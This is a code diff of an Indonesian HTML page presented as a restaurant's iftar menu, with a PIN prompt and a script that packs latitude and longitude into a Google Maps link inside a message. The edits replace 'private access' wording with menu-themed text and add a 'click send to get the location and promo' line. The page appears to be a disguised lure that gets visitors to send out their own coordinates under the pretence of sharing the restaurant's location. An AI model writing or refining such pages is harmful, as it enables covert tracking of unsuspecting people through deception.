@@ -7,7 +7,7 @@
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 
-  <title>Tempat & Menu Buka Hari Ini</title>
+  <title>Tempat & Menu Buka Puasa</title>
 
   <!-- FONT -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
@@ -19,8 +19,8 @@
 
   <!-- PIN BOX -->
   <div class="card" id="pinBox">
-    <h1>Tempat & Menu Buka Hari Ini</h1>
-    <p class="subtitle">Akses private • Masukkan PIN</p>
+    <h1>Tempat & Menu Buka Puasa</h1>
+    <p class="subtitle">Menu Harga • Masukkan PIN</p>
 
     <input
       type="password"
@@ -36,7 +36,7 @@
   <!-- LOADING -->
   <div class="card loading" id="loading">
     <div class="spinner"></div>
-    <p>Memproses permintaan…</p>
+    <p>Melihat Menu…</p>
   </div>
 
 <script>
@@ -70,7 +70,7 @@
 
         const pesan = encodeURIComponent(
           "Rumah Makan SediaSedap.\n\n" +
-          "Lokasi RM SediaSedap:\n" +
+          "Lokasi RM SediaSedap,Klik kirim untuk mendapatkan lokasi beserta promo:\n" +
           "https://maps.google.com/?q=" + lat + "," + lon
         );
 
@@ -90,4 +90,5 @@
 
 </body>
 </html>
+
 
